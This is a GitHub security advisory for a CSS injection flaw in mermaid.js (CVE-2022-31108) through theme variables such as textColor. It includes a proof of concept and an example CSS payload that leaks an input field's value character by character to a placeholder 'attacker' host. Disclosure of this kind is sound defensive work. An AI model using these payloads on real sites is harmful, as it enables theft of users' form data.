# [M] Possible inject arbitrary `CSS` into the generated graph affecting the container HTML

## Summary
Severity: Medium
Advisory: GHSA-x3vm-38hw-55wf
CVE: CVE-2022-31108
CWE: CWE-74, CWE-79
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:N/A:N (CVSS_V3)
Published: 2022-07-05
Source: https://github.com/advisories/GHSA-x3vm-38hw-55wf
Type: github-advisory

## Affected
- npm: `mermaid` — affected >=8.0.0 <9.1.2

## Details
An attacker is able to inject arbitrary `CSS` into the generated graph allowing them to change the styling of elements outside of the generated graph, and potentially exfiltrate sensitive information by using specially crafted `CSS` selectors.

The following example shows how an attacker can exfiltrate the contents of an input field by bruteforcing the `value` attribute one character at a time. Whenever there is an actual match, an `http` request will be made by the browser in order to "load" a background image that will let an attacker know what's the value of the character.

```css
input[name=secret][value^=g] { background-image: url(http://attacker/?char=g); }
...
input[name=secret][value^=go] { background-image: url(http://attacker/?char=o); }
...
input[name=secret][value^=goo] { background-image: url(http://attacker/?char=o); }
...
input[name=secret][value^=goos] { background-image: url(http://attacker/?char=s); }
...
input[name=secret][value^=goose] { background-image: url(http://attacker/?char=e); }
```

### Patches
_Has the problem been patched? What versions should users upgrade to?_

### Workarounds
_Is there a way for users to fix or remediate the vulnerability without upgrading?_

### References
_Are there any links users can visit to find out more?_

### For more information
If you have any questions or comments about this advisory:
* Open an issue in [example link to repo](http://example.com)
* Email us at [example email address](mailto:example@example.com)
## Product

mermaid.js

## Tested Version

[v9.1.1](https://github.com/mermaid-js/mermaid/releases/tag/9.1.1)

## Details

### Issue 1: Multiple CSS Injection (`GHSL-2022-036`)

By supplying a carefully crafted `textColor` theme variable, an attacker can inject arbitrary `CSS` rules into the document. In the following snippet we can see that `getStyles` does not sanitize any of the theme variables leaving the door open for `CSS` injection.

_Snippet from [src/styles.js](https://github.com/mermaid-js/mermaid/blob/9eae97ddab1b6eca58d2fd4af62357d2f4d8d1f7/src/styles.js#L35):_

```js
const getStyles = (type, userStyles, options) => {
  return ` {
    font-family: ${options.fontFamily};
    font-size: ${options.fontSize};
    fill: ${options.textColor}
  }
```

For example, if we set `textColor` to `"green;} #target { background-color: crimson }"` the resulting `CSS` will contain a new selector `#target` that will apply a `crimson` background color to an arbitrary element.

```html
<html>

<body>
    <div id="target">
        <h1>This element does not belong to the SVG but we can style it</h1>
    </div>
    <svg id="diagram">
    </svg>

    <script src="https://cdn.jsdelivr.net/npm/mermaid/dist/mermaid.min.js"></script>
    <script>
        mermaid.initialize({ startOnLoad: false });

        const graph =
            `
            %%{ init: { "themeVariables" : { "textColor": "green;} #target { background-color: crimson }" } } }%%
            graph TD
                A[Goose]
            `

        const diagram = document.getElementById("diagram")
        const svg = mermaid.render('diagram-svg', graph)
        diagram.innerHTML = svg
    </script>
</body>

</html>
```

In the proof of concept above we used the `textColor` variable to inject `CSS`, but there are multiple functions that can potentially be abused to change the style of the document. Some of them are in the following list but we encourage mantainers to look for additional injection points:

- https://github.com/mermaid-js/mermaid/blob/5d30d465354f804e361d7a041ec46da6bb5d583b/src/mermaidAPI.js#L393
- https://github.com/mermaid-js/mermaid/blob/5d30d465354f804e361d7a041ec46da6bb5d583b/src/styles.js#L35

#### Impact

This issue may lead to `Information Disclosure` via CSS selectors and functions able to generate HTTP requests. This also allows an attacker to change the document in ways which may lead a user to perform unintended actions, such as clicking on a link, etc.

#### Remediation

Ensure that user input is adequately escaped before embedding it in CSS blocks.

## References
- https://github.com/mermaid-js/mermaid/security/advisories/GHSA-x3vm-38hw-55wf
- https://nvd.nist.gov/vuln/detail/CVE-2022-31108
- https://github.com/mermaid-js/mermaid/commit/0ae1bdb61adff1cd485caff8c62ec6b8ac57b225
- https://github.com/mermaid-js/mermaid
